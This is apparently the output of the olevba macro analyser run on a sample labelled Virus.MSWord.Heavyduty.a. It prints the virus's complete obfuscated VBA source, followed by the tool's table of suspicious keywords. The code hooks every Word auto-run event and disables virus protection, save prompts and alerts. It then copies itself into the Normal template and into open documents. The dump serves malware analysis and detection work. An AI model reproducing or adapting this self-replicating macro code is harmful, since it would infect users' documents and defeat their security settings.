olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Heavyduty.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Heavyduty.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ThisDocument1.cls 
in file: Virus.MSWord.Heavyduty.a - OLE stream: 'Macros/VBA/ThisDocument1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub AUTOOPEN(): Call VLAM: End Sub
Private Sub AUTOCLOSE(): Call VLAM: End Sub
Private Sub AUTOEXEC(): Call VLAM: End Sub
Private Sub AUTOEXIT(): Call VLAM: End Sub
Private Sub AUTOSAVE(): Call VLAM: End Sub
Private Sub AUTONEW(): Call VLAM: End Sub
Private Sub DOCUMENT_OPEN(): Call VLAM: End Sub
Private Sub DOCUMENT_SAVE(): Call VLAM: End Sub
Private Sub DOCUMENT_CLOSE(): Call VLAM: End Sub
Private Sub DOCUMENT_NEW(): Call VLAM: End Sub
Private Sub FILEOPEN(): Call VLAM: End Sub
Private Sub FILESAVE(): Call VLAM: End Sub
Private Sub FILECLOSE(): Call VLAM: End Sub
Private Sub FILENEW(): Call VLAM: End Sub
Private Function T(STR)
For I = Asc(Mid(UCase(UCase(UCase(UCase("KKKK")))), Int(Rnd * 3) + Fix(Fix(Fix(1))), Int(1))) - 74 To Len(STR)
P = P & Chr(Asc(Mid(STR, I, Fix(Fix(Fix(1))))) Xor Int(Int(Int(Int(Int(3))))))
Next
T = P
End Function
Private Sub VLAM()
On Error Resume Next
DECLARATIONS:
Set APP = Application.Options.Application.Options.Application
Set OPT = Options.Application.Options.Application.Options
Set ST1 = APP.OPT.APP.OPT.APP.OPT.APP.OPT.APP.OPT.VirusProtection
Set ST2 = APP.OPT.APP.OPT.APP.OPT.APP.OPT.APP.OPT.SaveNormalPrompt
Set ST3 = OPT.APP.OPT.APP.OPT.APP.OPT.APP.OPT.APP.DisplayAlerts
Set ST4 = OPT.APP.OPT.APP.OPT.APP.OPT.APP.OPT.APP.EnableCancelKey
Set ST5 = OPT.APP.OPT.APP.OPT.APP.OPT.APP.OPT.APP.DisplayStatusBar
Set ST6 = OPT.APP.OPT.APP.OPT.APP.OPT.APP.OPT.APP.ShowVisualBasicEditor
Set SMA = APP.OPT.APP.OPT.APP.OPT.APP.OPT.APP.OPT.SendMailAttach
Set N = NormalTemplate
Set NV = N.VBProject
Set NVV = NV.VBCOMPONENTS(Asc(Mid(UCase(UCase(UCase(T("HHHH")))), Int(Int(Int(Int(Rnd * 3)))) + Fix(Fix(Fix(1))), Fix(Fix(Fix(1))))) - Int(Int(Int(Int(Int(74))))))
Set NVVC = NVV.CODEMODULE
Set A = ActiveDocument
Set AV = A.VBProject
Set AVV = AV.VBCOMPONENTS(Asc(Mid(UCase(UCase(UCase(T("HHHH")))), Int(Int(Int(Int(Rnd * 3)))) + Fix(Fix(Fix(1))), Fix(Fix(Fix(1))))) - Int(Int(Int(Int(Int(74))))))
Set AVVC = AVV.CODEMODULE
Set D = ThisDocument
Set DV = D.VBProject
Set DVV = DV.VBCOMPONENTS(Asc(Mid(UCase(UCase(UCase(T("HHHH")))), Int(Int(Int(Int(Rnd * 3)))) + Fix(Fix(Fix(1))), Fix(Fix(Fix(1))))) - Int(Int(Int(Int(Int(74))))))
Set DVVC = DVV.CODEMODULE
Set NORN = NVV.VBE.VBPROJECTS(Asc(Mid(UCase(UCase(UCase(T("HHHH")))), Int(Int(Int(Int(Rnd * 3)))) + Fix(Fix(Fix(1))), Fix(Fix(Fix(1))))) - Int(Int(Int(Int(Int(74))))))
Set DOCN = AVV.VBE.VBPROJECTS(Asc(Mid(UCase(UCase(UCase(T("HHHH")))), Int(Int(Int(Int(Rnd * 3)))) + Fix(Fix(Fix(1))), Fix(Fix(Fix(1))))) - Int(Int(Int(Int(Int(74))))))
SMA = Asc(Mid(UCase(UCase(UCase(T("HHHH")))), Int(Int(Int(Int(Rnd * 3)))) + Fix(Fix(Fix(1))), Fix(Fix(Fix(1))))) - Int(Int(Int(Int(Int(74)))))
MYCODE = UCase(UCase(UCase(UCase(DVVC.LINES((Asc(Mid(UCase(UCase(UCase(T("HHHH")))), Int(Rnd * 3) + Fix(Fix(Fix(1))), Fix(Fix(Fix(1))))) - Int(Int(Int(Int(Int(74)))))), 140)))))
NAAM = UCase(UCase(UCase("VLAM")))
ST1 = Asc(Mid(UCase(UCase(UCase(T("HHHH")))), Int(Int(Int(Int(Rnd * 3)))) + Fix(Fix(Fix(1))), Fix(Fix(Fix(1))))) - Int(Int(Int(Int(Int(75)))))
ST2 = Asc(Mid(UCase(UCase(UCase(T("HHHH")))), Int(Int(Int(Int(Rnd * 3)))) + Fix(Fix(Fix(1))), Fix(Fix(Fix(1))))) - Int(Int(Int(Int(Int(75)))))
ST3 = wdAlertsNone
ST4 = Asc(Mid(UCase(UCase(UCase(T("HHHH")))), Int(Int(Int(Int(Rnd * 3)))) + Fix(Fix(Fix(1))), Fix(Fix(Fix(1))))) - Int(Int(Int(Int(Int(75)))))
ST5 = Asc(Mid(UCase(UCase(UCase(T("HHHH")))), Int(Int(Int(Int(Rnd * 3)))) + Fix(Fix(Fix(1))), Fix(Fix(Fix(1))))) - Int(Int(Int(Int(Int(75)))))
ST6 = Asc(Mid(UCase(UCase(UCase(T("HHHH")))), Int(Int(Int(Int(Rnd * 3)))) + Fix(Fix(Fix(1))), Fix(Fix(Fix(1))))) - Int(Int(Int(Int(Int(75)))))
Select Case UCase(UCase(UCase(UCase(UCase(UCase(ThisDocument.Name))))))
Case UCase(UCase(UCase(UCase(UCase(UCase(UCase(T("MLQNBO-GLW"))))))))
    AVVC.DELETELINES (Asc(Mid(UCase(UCase(UCase(T("HHHH")))), Int(Int(Int(Int(Rnd * 3)))) + Fix(Fix(Fix(1))), Fix(Fix(Fix(1))))) - Int(Int(Int(Int(Int(74)))))), AVVC.COUNTOFLINES
    AVVC.ADDFROMSTRING UCase(MYCODE)
    DOCN.Name = UCase(UCase(UCase(NAAM)))
    ActiveDocument.Save
Case Is <> UCase(UCase(UCase(UCase(UCase(UCase(T("MLQNBO-GLW")))))))
    NVVC.DELETELINES (Asc(Mid(UCase(UCase(UCase(T("HHHH")))), Int(Int(Int(Int(Rnd * 3)))) + Fix(Fix(Fix(1))), Fix(Fix(Fix(1))))) - Int(Int(Int(Int(Int(74)))))), NVVC.COUNTOFLINES
    NVVC.ADDFROMSTRING UCase(MYCODE)
    NORN.Name = UCase(UCase(UCase(NAAM)))
    N.Save
End Select
If Day(Now()) = Int(Rnd * 31) + 1 Then
Application.Caption = NAAM & " " & ActiveDocument.Name
End If
'WM97.HEAVYDUTY
End Sub










































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AUTOEXEC            |Runs when the Word document is opened        |
|AutoExec  |AUTOOPEN            |Runs when the Word document is opened        |
|AutoExec  |AUTOEXIT            |Runs when the Word document is closed        |
|AutoExec  |AUTOCLOSE           |Runs when the Word document is closed        |
|AutoExec  |DOCUMENT_CLOSE      |Runs when the Word document is closed        |
|AutoExec  |AUTONEW             |Runs when a new Word document is created     |
|AutoExec  |DOCUMENT_NEW        |Runs when a new Word document is created     |
|AutoExec  |DOCUMENT_OPEN       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBCOMPONENTS        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CODEMODULE          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|ADDFROMSTRING       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |NVV.VBE             |Executable file name                         |
|IOC       |AVV.VBE             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

